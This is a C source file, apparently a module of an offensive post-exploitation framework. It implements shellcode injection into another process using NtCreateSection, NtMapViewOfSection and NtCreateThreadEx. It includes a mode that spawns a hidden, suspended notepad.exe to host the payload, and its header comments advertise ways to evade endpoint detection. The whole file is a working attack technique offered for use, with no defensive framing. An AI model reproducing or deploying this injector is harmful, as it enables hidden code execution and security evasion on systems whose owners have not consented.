// section_map -- Process injection via NtCreateSection + NtMapViewOfSection.
//
// Instead of VirtualAllocEx + WriteProcessMemory, this method:
//   1. Creates a shared section object (RWX)
//   2. Maps it into the current process (RW) for writing
//   3. Maps it into the target process (RX) for execution
//   4. Writes shellcode into the local mapping
//   5. Unmaps the local view
//   6. Creates a thread in the target at the remote mapping
//
// OPSEC advantages:
//   - No WriteProcessMemory call (common EDR hook point)
//   - Memory appears as section-backed (not private), less suspicious
//   - Can combine with module stomping for better evasion
//
// Handles THREAD and SPAWN methods. APC falls back to THREAD.

#include "../../process_inject_api.h"

// Forward declarations.
static uint32_t do_section_inject(InjectCtx* ctx, HANDLE hp);
static uint32_t do_spawn_section(InjectCtx* ctx);

// ---- ENTRY POINT (must be first defined function) -------------------------

uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
    if (ctx->method_hint == INJECT_METHOD_SPAWN)
        return do_spawn_section(ctx);
    // THREAD and APC both use section mapping + thread creation.
    if (!ctx->target_process) return INJECT_ERR_PROCESS;
    return do_section_inject(ctx, ctx->target_process);
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

static uint32_t do_section_inject(InjectCtx* ctx, HANDLE hp) {
    // 1. Create section (size = payload_len, PAGE_EXECUTE_READWRITE).
    HANDLE hSection = NULL;
    LARGE_INTEGER sec_size;
    sec_size.QuadPart = (LONGLONG)ctx->payload_len;

    NTSTATUS ns = ctx->NtCreateSection(
        &hSection,
        0x000F001F, // SECTION_ALL_ACCESS
        NULL,
        &sec_size,
        0x40, // PAGE_EXECUTE_READWRITE
        0x08000000, // SEC_COMMIT
        NULL);
    if (ns < 0 || !hSection) return INJECT_ERR_ALLOC;

    // 2. Map into local process (RW for writing).
    PVOID local_base = NULL;
    SIZE_T local_size = 0;
    ns = ctx->NtMapViewOfSection(
        hSection, ctx->self_process,
        &local_base, 0, (SIZE_T)ctx->payload_len,
        NULL, &local_size,
        2, // ViewUnmap
        0,
        0x04); // PAGE_READWRITE
    if (ns < 0 || !local_base) {
        ctx->NtClose(hSection);
        return INJECT_ERR_ALLOC;
    }

    // 3. Map into target process (RX for execution).
    PVOID remote_base = NULL;
    SIZE_T remote_size = 0;
    ns = ctx->NtMapViewOfSection(
        hSection, hp,
        &remote_base, 0, (SIZE_T)ctx->payload_len,
        NULL, &remote_size,
        2, // ViewUnmap
        0,
        0x20); // PAGE_EXECUTE_READ
    if (ns < 0 || !remote_base) {
        ctx->NtUnmapViewOfSection(ctx->self_process, local_base);
        ctx->NtClose(hSection);
        return INJECT_ERR_ALLOC;
    }

    // 4. Copy shellcode into local mapping (reflects in remote view).
    uint8_t* dst = (uint8_t*)local_base;
    const uint8_t* src = ctx->payload;
    for (uint32_t i = 0; i < ctx->payload_len; ++i)
        dst[i] = src[i];

    // 5. Unmap local view (no longer needed).
    ctx->NtUnmapViewOfSection(ctx->self_process, local_base);

    // 6. Close section handle (views remain valid).
    ctx->NtClose(hSection);

    ctx->out_remote_base = remote_base;

    // 7. Create remote thread at the mapped code.
    HANDLE hth = NULL;
    ns = ctx->NtCreateThreadEx(
        &hth, 0x1FFFFF, NULL, hp, remote_base, NULL, 0, 0, 0, 0, NULL);
    if (ns < 0 || !hth) return INJECT_ERR_THREAD;

    ctx->out_thread = hth;
    return INJECT_OK;
}

static uint32_t do_spawn_section(InjectCtx* ctx) {
    uint16_t default_spawn[] = {
        'C',':','\\','W','i','n','d','o','w','s','\\',
        'S','y','s','t','e','m','3','2','\\',
        'n','o','t','e','p','a','d','.','e','x','e',0
    };

    uint16_t* cmd = (uint16_t*)ctx->spawn_to;
    if (!cmd || !cmd[0]) cmd = default_spawn;

    typedef struct {
        DWORD  cb;
        void*  lpReserved;
        void*  lpDesktop;
        void*  lpTitle;
        DWORD  dwX;
        DWORD  dwY;
        DWORD  dwXSize;
        DWORD  dwYSize;
        DWORD  dwXCountChars;
        DWORD  dwYCountChars;
        DWORD  dwFillAttribute;
        DWORD  dwFlags;
        WORD   wShowWindow;
        WORD   cbReserved2;
        void*  lpReserved2;
        HANDLE hStdInput;
        HANDLE hStdOutput;
        HANDLE hStdError;
    } SIW;

    typedef struct {
        HANDLE hProcess;
        HANDLE hThread;
        DWORD  dwProcessId;
        DWORD  dwThreadId;
    } PIW;

    SIW si;
    for (uint32_t i = 0; i < sizeof(si); ++i) ((volatile uint8_t*)&si)[i] = 0;
    si.cb = sizeof(si);
    si.dwFlags = 0x00000001;
    si.wShowWindow = 0;

    PIW pi;
    for (uint32_t i = 0; i < sizeof(pi); ++i) ((volatile uint8_t*)&pi)[i] = 0;

    BOOL ok = ctx->CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                                  0x00000004 | 0x08000000,
                                  NULL, NULL, &si, &pi);
    if (!ok) return INJECT_ERR_PROCESS;

    uint32_t result = do_section_inject(ctx, pi.hProcess);
    if (result != INJECT_OK) {
        ctx->TerminateProcess(pi.hProcess, 1);
        ctx->CloseHandle(pi.hThread);
        ctx->CloseHandle(pi.hProcess);
        return result;
    }

    ctx->out_process = pi.hProcess;
    ctx->CloseHandle(pi.hThread);
    return INJECT_OK;
}
